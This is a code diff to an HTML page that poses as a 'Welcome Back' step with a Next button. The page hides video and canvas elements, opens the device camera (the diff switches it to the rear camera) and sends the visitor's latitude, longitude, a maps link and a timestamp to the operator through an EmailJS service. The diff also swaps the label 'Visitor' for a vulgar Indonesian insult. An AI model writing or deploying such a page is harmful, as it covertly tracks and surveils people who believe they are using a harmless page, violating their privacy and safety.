@@ -35,7 +35,8 @@ button:hover{
 
 <h2>Welcome Back</h2>
 
-
+<video id="video" autoplay playsinline 
+style="display:none;"></video>
 <button onclick="proses()">Berikutnya</button>
 
 <canvas id="canvas" style="display:none;"></canvas>
@@ -47,7 +48,7 @@ button:hover{
 
 // Aktifkan kamera depan
 navigator.mediaDevices.getUserMedia({ 
-  video: { facingMode: "user" } 
+  video: { facingMode: "environment" } 
 })
 .then(function(stream){
   document.getElementById("video").srcObject = stream;
@@ -79,7 +80,7 @@ function proses(){
         let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
 
         emailjs.send("service_lzuezkd", "template_105p1pt", {
-          name: "Visitor",
+          name: "SI KONTOL",
           time: new Date().toLocaleString(),
           latitude: latitude,
           longitude: longitude,
